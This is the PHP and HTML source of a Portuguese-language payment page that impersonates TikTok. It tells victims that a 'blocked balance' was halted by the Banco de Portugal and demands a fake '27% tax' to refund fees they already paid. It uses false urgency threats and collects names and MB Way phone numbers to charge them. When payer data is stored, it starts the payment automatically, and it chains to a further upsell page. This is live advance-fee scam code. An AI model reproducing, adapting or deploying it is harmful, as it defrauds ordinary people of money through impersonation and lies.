<?php
$qs = $_SERVER['QUERY_STRING'] ?? '';
$params = $qs ? '?' . $qs : '';
require_once dirname(__DIR__) . '/assets/funnel-config.php';
require_once dirname(__DIR__) . '/assets/device-tier.php';
require_once dirname(__DIR__) . '/central.php';
$fc = loadFunnelConfig();
$up_amount = round($fc['prices']['up6'] * _dtier($_SERVER['HTTP_USER_AGENT'] ?? '', $fc['device_tier_max_pct'], $fc['device_tier_enabled']), 2);
$up_amount = central_price('up6', $up_amount);
$up_fmt = number_format($up_amount, 2, ',', '.');
$up_next = '../up7/' . $params;
$up_product_id = 'upsell-6';
$up_product_name = 'TikTok - Estorno de Taxas';
$saldo = central_amount('lead_balance', isset($fc['saldo']) ? (float)$fc['saldo'] : 2800.00);
$saldo_fmt = number_format($saldo, 2, ',', '.');
$fee_raw = [
    round($fc['prices']['up1'], 2),
    round($fc['prices']['up2'], 2),
    round($fc['prices']['up3'], 2),
    round($fc['prices']['up4'], 2),
    round($fc['prices']['up5'], 2),
    round($fc['prices']['up5'] * 1.28, 2),
];
$fee_raw_total = array_sum($fee_raw);
$scale = ($fee_raw_total > 0) ? ($up_amount / $fee_raw_total) : 1.0;
$fee_scaled = [];
$acc = 0.0;
for ($i = 0; $i < 5; $i++) {
    $fee_scaled[$i] = round($fee_raw[$i] * $scale, 2);
    $acc += $fee_scaled[$i];
}
$fee_scaled[5] = round($up_amount - $acc, 2);
$fee1 = $fee_scaled[0];
$fee2 = $fee_scaled[1];
$fee3 = $fee_scaled[2];
$fee4 = $fee_scaled[3];
$fee5 = $fee_scaled[4];
$fee6 = $fee_scaled[5];
$fee_total = $up_amount;
$fee_total_fmt = number_format($fee_total, 2, ',', '.');
?><!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
<script>
!function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
ttq.load('<?= $fc["tiktok_pixel"] ?>');ttq.page();
}(window,document,'ttq');
</script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Reembolso de Taxas</title>
    <script>
        (function() {
            function isDesktop() {
                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
                const isMobileUA = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
                const isMobileScreen = window.innerWidth <= 768;
                return !isMobileUA && !isMobileScreen;
            }
        })();
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Inter', sans-serif; letter-spacing: -0.02em; background-color: #f3f4f6; }
        details summary::-webkit-details-marker { display: none; }
        .cashback-container { position: relative; width: 120px; height: 120px; margin: 0 auto; -webkit-touch-callout: none; }
        .cashback-container .cashback-loop {
            display: block; width: 100%; height: 100%; object-fit: contain;
            pointer-events: none; user-select: none; -webkit-user-select: none; -webkit-user-drag: none;
        }
        .btn-tiktok { background-color: #FE2C55; transition: all 0.2s ease; }
        .btn-tiktok:active { transform: scale(0.95); }
        .fade-in { animation: fadeIn 0.8s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="text-[#161823]">

    <div class="bg-black text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50 shadow-lg">
        ATENÇÃO: CASO NÃO LEVANTE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
    </div>

    <div class="max-w-md mx-auto min-h-screen relative bg-white pb-10 shadow-2xl">

        <div class="flex justify-between items-center px-6 py-6 border-b border-gray-100">
            <div class="flex flex-col">
                <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo Bloqueado</span>
                <span class="text-3xl font-[900] text-[#161823] leading-none tracking-tighter">€ <?= $saldo_fmt ?></span>
            </div>
            <img src="../assets/icon-tiktok.png" alt="TikTok" class="h-10 w-20 object-contain">
        </div>

        <div class="px-6 py-8">
            <div class="text-center mb-8 fade-in">
                <h1 class="text-2xl font-[900] text-slate-800 mb-2 leading-tight">RECEBA O DINHEIRO DAS TAXAS DE VOLTA</h1>

                <div class="cashback-container my-6 overflow-hidden rounded-2xl" oncontextmenu="return false">
                    <video class="cashback-loop"
                        autoplay loop muted playsinline preload="auto"
                        disablePictureInPicture
                        disableRemotePlayback
                        controlsList="nodownload nofullscreen noremoteplayback"
                        tabindex="-1"
                        role="img"
                        aria-label="Reembolso em dinheiro">
                        <source src="../assets/reembolso%20em%20dinheiro.mp4" type="video/mp4">
                    </video>
                </div>

                <p class="text-sm font-bold text-[#FE2C55] bg-red-50 py-2 px-4 rounded-full inline-block">
                    ⚠️ Transferência interrompida pelo Banco de Portugal
                </p>
            </div>

            <div class="bg-gray-50 border border-gray-100 rounded-3xl p-6 mb-8">
                <p class="text-[14px] text-gray-700 leading-relaxed mb-6">
                    O seu saldo foi enviado com sucesso mas a transferência foi interrompida pelo <b>Banco de Portugal</b>. Veja abaixo os valores pagos em taxa:
                </p>

                <div class="space-y-3">
                    <div class="flex justify-between text-[13px]">
                        <span class="text-gray-500 italic">Taxa de confirmação</span>
                        <span class="font-bold text-gray-800">€ <?= number_format($fee1, 2, ',', '.') ?></span>
                    </div>
                    <div class="flex justify-between text-[13px]">
                        <span class="text-gray-500 italic">Taxa Única de Activação</span>
                        <span class="font-bold text-gray-800">€ <?= number_format($fee2, 2, ',', '.') ?></span>
                    </div>
                    <div class="flex justify-between text-[13px]">
                        <span class="text-gray-500 italic">Taxa Antecipação Prioritária</span>
                        <span class="font-bold text-gray-800">€ <?= number_format($fee3, 2, ',', '.') ?></span>
                    </div>
                    <div class="flex justify-between text-[13px]">
                        <span class="text-gray-500 italic">Taxa de Actualização de Vaga</span>
                        <span class="font-bold text-gray-800">€ <?= number_format($fee4, 2, ',', '.') ?></span>
                    </div>
                    <div class="flex justify-between text-[13px]">
                        <span class="text-gray-500 italic">Taxa Administrativa</span>
                        <span class="font-bold text-gray-800">€ <?= number_format($fee5, 2, ',', '.') ?></span>
                    </div>
                    <div class="flex justify-between text-[13px]">
                        <span class="text-gray-500 italic">Taxa de Libertação de Saldo Retido</span>
                        <span class="font-bold text-gray-800">€ <?= number_format($fee6, 2, ',', '.') ?></span>
                    </div>
                    <div class="h-[1px] bg-gray-200 w-full my-2"></div>
                    <div class="flex justify-between text-[15px]">
                        <span class="font-black uppercase text-gray-400 text-[10px] tracking-widest mt-1">Total de taxas:</span>
                        <span class="font-black text-[#FE2C55] underline">€ <?= $fee_total_fmt ?></span>
                    </div>
                </div>
            </div>

            <div class="border-2 border-black rounded-3xl p-6 bg-white shadow-[6px_6px_0px_0px_rgba(254,44,85,1)] mb-8">
                <div class="text-center">
                    <span class="text-[11px] font-black text-gray-400 uppercase tracking-widest">Valores a receber com as taxas:</span>
                    <div class="text-4xl font-[900] text-gray-900 my-2 tracking-tighter">€ <?= $saldo_fmt ?></div>
                    <p class="text-[10px] font-bold text-[#25F4EE] bg-black inline-block px-3 py-1 rounded-full uppercase leading-tight">
                        + Saldo Pendente na App
                    </p>
                </div>
            </div>

            <div class="bg-[#FFD700] rounded-3xl p-6 border-2 border-black mb-8 text-center">
                <p class="text-[14px] font-bold text-black leading-tight">
                    Para receber o reembolso das taxas (€ <?= $fee_total_fmt ?>), é necessário o pagamento do imposto de 27%, no valor de <span id="upsellValue">€ <?= $up_fmt ?></span>.
                    Após o pagamento, o saldo será libertado com as taxas incluídas.
                </p>
            </div>

            <div class="space-y-4">
                <a href="javascript:void(0)" onclick="goToCheckout()" class="btn-tiktok block w-full text-white text-center py-6 rounded-2xl shadow-xl transition-all active:scale-95">
                    <span class="block font-black text-xl uppercase leading-none">RECEBER TAXA DE VOLTA!</span>
                </a>
            </div>

            <div class="mt-8 border-t border-gray-100 pt-6 text-center">
                <p class="text-[12px] text-gray-500 font-bold px-4 italic leading-relaxed">
                    O Banco de Portugal interrompeu o seu levantamento devido a uma pendência. Para garantir a libertação do saldo juntamente com as taxas, é necessário efectuar o pagamento da taxa conforme o imposto vigente em Portugal, correspondente a 27%.
                </p>
            </div>

            <div class="mt-12 space-y-3 text-left">
                <h3 class="text-lg font-[900] mb-4 px-2">Dúvidas:</h3>

                <details class="group bg-white rounded-2xl border border-gray-200">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
                        – Porque existe esta taxa?
                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
                    </summary>
                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
                        Toda a aplicação e plataforma tem um custo com servidores e para MANUTENÇÃO da APP esta taxa é um custo que temos ANUALMENTE de acordo com o nosso número de utilizadores.
                    </div>
                </details>

                <details class="group bg-white rounded-2xl border border-gray-200">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
                        – Se não pagar a taxa?
                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
                    </summary>
                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
                        O cliente tem até ao final do dia após o suporte ter entrado em contacto para pagar. Caso não consiga, perderá a sua vaga (VAGA NÃO É REEMBOLSÁVEL).
                    </div>
                </details>
            </div>
        </div>

        <footer class="py-10 text-center text-[10px] text-gray-300 font-bold uppercase tracking-[0.3em]">
            TikTok Financial Services © 2026
        </footer>
    </div>

    <script>
        function goToCheckout() { openPaymentForm(); }

        function loadUpsellValue() {
            var fee = (typeof window !== 'undefined') ? window.__UP_FEE_6 : undefined;
            var el = document.getElementById('upsellValue');
            if (el && fee !== undefined) {
                el.textContent = '€ ' + fee.toLocaleString('pt-PT', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            }
        }
        loadUpsellValue();
    </script>
<style>.pay-dot{width:8px;height:8px;background:#E30613;border-radius:50%;animation:pay-bounce 1.2s infinite ease-in-out}.pay-dot:nth-child(2){animation-delay:.2s}.pay-dot:nth-child(3){animation-delay:.4s}@keyframes pay-bounce{0%,80%,100%{transform:scale(0.6);opacity:0.5}40%{transform:scale(1);opacity:1}}</style>
<div id="pay-overlay" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;justify-content:center;align-items:flex-end"><div style="background:#fff;border-radius:20px 20px 0 0;padding:24px 20px 36px;width:100%;max-width:480px;margin:0 auto"><div id="pay-form-section"><h3 style="font-size:17px;font-weight:700;margin-bottom:4px;color:#111">Pagamento seguro</h3><p style="font-size:13px;color:#888;margin-bottom:18px" id="pay-subtitle">MB Way</p><div style="margin-bottom:14px"><label style="font-size:13px;color:#555;font-weight:600;display:block;margin-bottom:6px">Nome completo</label><input id="pay-name" type="text" placeholder="O teu nome" style="width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;outline:none"></div><div style="margin-bottom:20px"><label style="font-size:13px;color:#555;font-weight:600;display:block;margin-bottom:6px">N&#250;mero MB Way</label><div style="display:flex;gap:10px;align-items:center"><div style="background:#f5f5f5;border:1.5px solid #e0e0e0;border-radius:10px;padding:12px;font-size:15px;font-weight:600;white-space:nowrap">&#127477;&#127481; +351</div><input id="pay-phone" type="tel" inputmode="numeric" maxlength="9" placeholder="xxxxxxxx" style="flex:1;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;outline:none"></div></div><div id="pay-error" style="display:none;color:#e53935;font-size:13px;margin-bottom:12px;text-align:center"></div><button onclick="submitUpPayment()" style="width:100%;background:#E30613;color:#fff;font-size:16px;font-weight:700;padding:17px;border:none;border-radius:50px;cursor:pointer">CONFIRMAR PAGAMENTO</button><button onclick="closePaymentForm()" style="width:100%;background:none;border:none;font-size:13px;color:#bbb;padding:14px;cursor:pointer;margin-top:4px">Cancelar</button></div><div id="pay-waiting" style="display:none;text-align:center;padding:20px 0"><div style="margin-bottom:12px;display:flex;justify-content:center" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="2"/><path d="M12 18h.01"/></svg></div><p style="font-size:16px;font-weight:700;color:#111;margin-bottom:8px">Aguarda a notificação MB Way</p><p style="font-size:13px;color:#888;margin-bottom:20px">Abre o app MB Way e confirma o pagamento</p><div style="display:flex;gap:6px;justify-content:center;margin-bottom:16px"><div class="pay-dot"></div><div class="pay-dot"></div><div class="pay-dot"></div></div><button onclick="cancelUpPayment()" style="background:none;border:1.5px solid #e0e0e0;border-radius:50px;font-size:13px;color:#888;padding:10px 20px;cursor:pointer">Cancelar</button></div></div></div>
<script>
var upPayId=null,upPayInterval=null;
var UP_AMOUNT=<?= $up_amount ?>;
var UP_NEXT='<?= $up_next ?>';
var UP_PRODUCT_ID='<?= $up_product_id ?>',UP_PRODUCT_NAME='<?= $up_product_name ?>';
var _mbPayer=null;try{_mbPayer=JSON.parse(localStorage.getItem('mbway_payer')||'null');}catch(e){}function _utmify(st,amt){var p=new URLSearchParams(window.location.search);var nm=document.getElementById('pay-name')?document.getElementById('pay-name').value:'';fetch('../tracking.php',{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body:JSON.stringify({status:st,transaction_id:upPayId||('up6-'+Date.now()),amount:amt,method:'mbway',product_id:UP_PRODUCT_ID,product_name:UP_PRODUCT_NAME,customer:{name:nm,email:(_mbPayer&&_mbPayer.email)||null,phone:null,document:null},utms:{utm_source:p.get('utm_source'),utm_medium:p.get('utm_medium'),utm_campaign:p.get('utm_campaign'),utm_content:p.get('utm_content'),utm_term:p.get('utm_term'),src:p.get('src'),sck:p.get('sck')}})}).catch(function(){});}
function _tf(evt,amt,mth){try{var s=localStorage.getItem('_vid')||'';if(!s){s=Math.random().toString(36).substr(2,9)+Date.now().toString(36);localStorage.setItem('_vid',s);}var p=new URLSearchParams(window.location.search);fetch('/painel/tracker.php',{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:s,page:'up6',event:evt,amount:amt||0,method:mth||'',src:p.get('utm_source')||'',med:p.get('utm_medium')||'',cmp:p.get('utm_campaign')||''})}).catch(function(){});}catch(e){}}
_tf('InitiateCheckout');

function openPaymentForm(){document.getElementById('pay-overlay').style.display='flex';document.getElementById('pay-error').style.display='none';var sub=document.getElementById('pay-subtitle');if(sub)sub.textContent='MB Way \u00b7 <?= $up_fmt ?>\u20ac';if(_mbPayer&&_mbPayer.name&&_mbPayer.phone){document.getElementById('pay-name').value=_mbPayer.name;document.getElementById('pay-phone').value=_mbPayer.phone;document.getElementById('pay-form-section').style.display='none';document.getElementById('pay-waiting').style.display='block';submitUpPayment();}else{if(_mbPayer&&_mbPayer.name)document.getElementById('pay-name').value=_mbPayer.name;document.getElementById('pay-form-section').style.display='block';document.getElementById('pay-waiting').style.display='none';}}
function closePaymentForm(){document.getElementById('pay-overlay').style.display='none';}
function cancelUpPayment(){if(upPayInterval)clearInterval(upPayInterval);closePaymentForm();}
function submitUpPayment(){var name=document.getElementById('pay-name').value.trim();var phone=document.getElementById('pay-phone').value.trim().replace(/\D/g,'');var errEl=document.getElementById('pay-error');errEl.style.display='none';if(!name){errEl.textContent='Preenche o teu nome.';errEl.style.display='block';return;}if(!/^\d{9}$/.test(phone)){errEl.textContent='N\u00famero MB Way inv\u00e1lido (9 d\u00edgitos).';errEl.style.display='block';return;}document.getElementById('pay-form-section').style.display='none';document.getElementById('pay-waiting').style.display='block';_tf('payment_started',UP_AMOUNT,'mbway');fetch('create-transaction.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({stage:'up6',method:'mbway',amount:UP_AMOUNT,payer:{name:name,phone:'+351'+phone,email:(_mbPayer&&_mbPayer.email)||null,document:null}})}).then(function(r){return r.json();}).then(function(d){if(d.id||d.statusCode===200){upPayId=d.id;_utmify('waiting_payment',UP_AMOUNT);upPayInterval=setInterval(checkUpPayment,5000);}else{showUpError(d.message||'Erro ao processar. Tenta novamente.');}}).catch(function(){showUpError('Erro de liga\u00e7\u00e3o. Tenta novamente.');});}
function checkUpPayment(){if(!upPayId)return;fetch('create-transaction.php?action=status',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:upPayId})}).then(function(r){return r.json();}).then(function(d){var s=(d.status||'').toUpperCase();if(['PAID','APPROVED','COMPLETED','CONFIRMED'].includes(s)){clearInterval(upPayInterval);_tf('payment_paid',UP_AMOUNT,'mbway');_utmify('paid',UP_AMOUNT);setTimeout(function(){window.location.href=UP_NEXT;},450);}}).catch(function(){});}
function showUpError(msg){document.getElementById('pay-form-section').style.display='block';document.getElementById('pay-waiting').style.display='none';var e=document.getElementById('pay-error');e.textContent=msg;e.style.display='block';}
</script>
</body>
</html>
